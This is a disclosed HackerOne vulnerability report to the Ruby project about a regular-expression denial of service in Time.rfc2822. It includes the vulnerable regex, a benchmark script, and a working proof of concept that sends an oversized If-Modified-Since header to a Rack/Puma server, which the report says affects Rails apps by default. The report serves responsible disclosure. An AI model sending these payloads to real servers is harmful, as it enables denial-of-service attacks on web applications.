# ReDoS in Time.rfc2822

## Report Details
- **Report ID**: 1485501
- **URL**: https://hackerone.com/reports/1485501
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2022-02-18T22:22:29.876Z
- **Disclosed**: 2023-05-16T03:07:30.089Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
Hello, I found a pattern that occur ReDoS in `Time.rfc2822` (and `Time.rfc822`).

https://github.com/ruby/time/blob/v0.2.0/lib/time.rb#L505

```ruby
    def rfc2822(date)
      if /\A\s*
          (?:(?:Mon|Tue|Wed|Thu|Fri|Sat|Sun)\s*,\s*)?
          (\d{1,2})\s+
          (Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+
          (\d{2,})\s+
          (\d{2})\s*
          :\s*(\d{2})\s*
          (?::\s*(\d{2}))?\s+
          ([+-]\d{4}|
           UT|GMT|EST|EDT|CST|CDT|MST|MDT|PST|PDT|[A-IK-Z])/ix =~ date
```           

It is a detect result by `recheck` ( https://makenowjust-labs.github.io/recheck/ ).

{F1624605}

## PoC

```
❯ ruby -v
ruby 3.1.1p18 (2022-02-18 revision 53f5fc4236) [arm64-darwin20]

❯ irb
irb(main):001:0> require 'time'
=> true
irb(main):002:0>  Time.rfc2822 "0 Feb 00 00 :00" + " " * 20000
# => ReDoS (and raise ArgumentError)
```

## benchmark

rfc2822_benchmark.rb

```ruby
require 'benchmark'
require 'time'
  
def rfc2822_parse(length)
  text = "0 Feb 00 00 :00" + " " * length
  Time.rfc2822(text)
rescue ArgumentError
  nil
end

Benchmark.bm do |x|
  x.report { rfc2822_parse(100) }
  x.report { rfc2822_parse(1000) }
  x.report { rfc2822_parse(10000) }
  x.report { rfc2822_parse(100000) }
end
```

```
❯ bundle exec ruby rfc2822_benchmark.rb
       user     system      total        real
   0.000326   0.000009   0.000335 (  0.000344)
   0.029284   0.000054   0.029338 (  0.029469)
   2.860528   0.007354   2.867882 (  2.875771)
 290.843621   0.889107 291.732728 (292.665729)
```

---


## Rack

In `Rack::ConditionalGet`, the header value is parsed by `Time.rfc2822`, so it is possible to attack from the request.

https://github.com/rack/rack/blob/2.2.3/lib/rack/conditional_get.rb#L52

### PoC

Gemfile

```
# frozen_string_literal: true

source "https://rubygems.org"

gem 'rack', '~> 2.2', '>= 2.2.3'
gem 'puma', '~> 5.6', '>= 5.6.2'
```

config.ru

```ruby
class Server
  def call(env)
    # puts env
    [ 200, {}, ["..."]]
  end
end

use ::Rack::ConditionalGet
run Server.new
```

```ruby
require 'net/http'

url = URI.parse('http://127.0.0.1:9292/')

req = Net::HTTP::Get.new(url.path)

req['IF_MODIFIED_SINCE'] =  "0 Feb 00 00 :00" + " " * 20000 + "+0"

res = Net::HTTP.start(url.host, url.port) {|http|
  http.request(req)
}
puts res.body
```

```
❯ time bundle exec ruby rfc2822_request.rb
...
bundle exec ruby rfc2822_request.rb  0.18s user 0.07s system 2% cpu 11.516 total
```

## Impact

ReDoS occurs when `Time.rfc2822` accepts user input.

Rails uses `::Rack::ConditionalGet` by default, so it can be attacked by a request from the client.

If using nginx etc., the header length is limited to about 8k bytes, so it seems to be less affected. ( https://stackoverflow.com/questions/686217/maximum-on-http-header-values )

On the other hand, puma is susceptible because it can be used up to 80 * 1024.

## Attachments
- recheck_1.png
